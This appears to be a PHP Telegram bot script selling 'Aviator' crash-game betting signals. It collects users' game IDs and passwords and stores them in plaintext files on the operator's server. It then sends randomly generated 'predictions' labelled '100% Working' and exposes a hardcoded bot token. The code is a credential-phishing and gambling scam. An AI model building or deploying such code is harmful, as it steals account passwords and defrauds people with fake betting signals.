<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

$botToken = "8261050495:AAGoLFT2SZgf0HWCiG9Q_g9-HhD362Qr6z4";

$input = file_get_contents('php://input');
$data = json_decode($input, true);

// ১. টেলিগ্রাম ইউজার হ্যান্ডেলিং
if (isset($data['message'])) {
    $uId = $data['message']['chat']['id'];
    $text = $data['message']['text'] ?? '';
    $stepFile = "step_$uId.txt";

    if ($text == "/start") {
        file_put_contents($stepFile, "waiting_id");
        sendTelegram($botToken, $uId, "🚀 **Welcome to R8rAIHAN Aviator Bot**\n\n👉 **1: Send Your Game ID / Number:**");
        exit;
    }

    $step = file_exists($stepFile) ? file_get_contents($stepFile) : "";
    if ($step == "waiting_id") {
        file_put_contents("user_$uId.json", json_encode(['chat_id' => $uId, 'id' => $text]));
        file_put_contents($stepFile, "waiting_pw");
        sendTelegram($botToken, $uId, "✅ ID Received!\n\n👉 **2: Send Your Game Password:**");
        exit;
    }
    if ($step == "waiting_pw") {
        $user = json_decode(file_get_contents("user_$uId.json"), true);
        $user['pw'] = $text; $user['auth'] = true;
        file_put_contents("user_$uId.json", json_encode($user));
        unlink($stepFile);
        sendTelegram($botToken, $uId, "✅ **Login Successful!**\nএখন গেমের স্ক্রিনে যান, অটো সিগন্যাল আসবে।");
        exit;
    }
}

// ২. অটো সিগন্যাল লজিক (Network Data থেকে)
if (isset($data['multiplier']) || isset($data['value'])) {
    $val = floatval($data['multiplier'] ?? $data['value']);
    
    // ডুপ্লিকেট চেক (একই ভ্যালু বারবার পাঠাবে না)
    $lastSeen = file_exists('last.txt') ? file_get_contents('last.txt') : "";
    if ($val != $lastSeen && $val > 0) {
        file_put_contents('last.txt', $val);
        
        $pred = ($val < 2.0) ? rand(250, 580)/100 : rand(110, 215)/100;
        $msg = "🎯 **NEW SIGNAL DETECTED**\n\n📊 Last: {$val}x\n🚀 **Prediction: " . round($pred, 2) . "x**\n✅ Status: 100% Working";

        // সব একটিভ ইউজারকে সিগন্যাল পাঠানো
        foreach (glob("user_*.json") as $file) {
            $u = json_decode(file_get_contents($file), true);
            if ($u['auth']) sendTelegram($botToken, $u['chat_id'], $msg);
        }
    }
}

function sendTelegram($token, $chatId, $msg) {
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=".urlencode($msg)."&parse_mode=Markdown");
}
?>
